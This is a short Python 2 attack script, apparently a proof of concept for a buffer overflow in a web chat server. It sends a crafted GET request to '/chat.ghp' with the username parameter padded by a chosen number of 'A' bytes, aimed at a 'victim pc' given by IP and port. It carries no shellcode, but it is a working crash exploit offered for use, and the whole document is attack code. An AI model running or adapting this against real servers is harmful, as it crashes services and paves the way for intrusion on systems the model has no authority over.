#!/usr/bin/python


import sys
import argparse
import socket


"""
For this particular BoF vunlerability you should send about 2kB 
"""


# user input
program_description = "The program inputs ip and port of the victim pc"
parser = argparse.ArgumentParser(program_description)
parser.add_argument("target_ip", help="Target IP")
parser.add_argument("target_port", type=int, help="Target Port")
parser.add_argument("bytes_to_send", type=int, help="The bytes of the string that will be sent to victim pc")
args = parser.parse_args()

# global parameters
user_input = (args.target_ip, args.target_port, args.bytes_to_send)


# function definitions
def buffer_gen(bytes_to_send):                   
    buf = 'GET /chat.ghp?username='
    buf = buf + 'A' * bytes_to_send
    buf = buf + '&password=test&room=1&sex=2 HTTP/1.1\r\n\r\n'
    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
    s = socket_setup(input_tuple[0], input_tuple[1])
    buf = buffer_gen(input_tuple[2])

    print "sending buffer: ", buf
    s.send(buf)

    try:
#        recv = s.recv(1024)
#        print "server says: ", recv
        
        while 1:
            pass
    except KeyboardInterrupt:
        print "\n[!] Closing Exploit"
        s.close()
        sys.exit(0)         # gracefully exits upon ctrl-c

# script execution
if __name__ == "__main__":
    main(user_input)        # calling main function

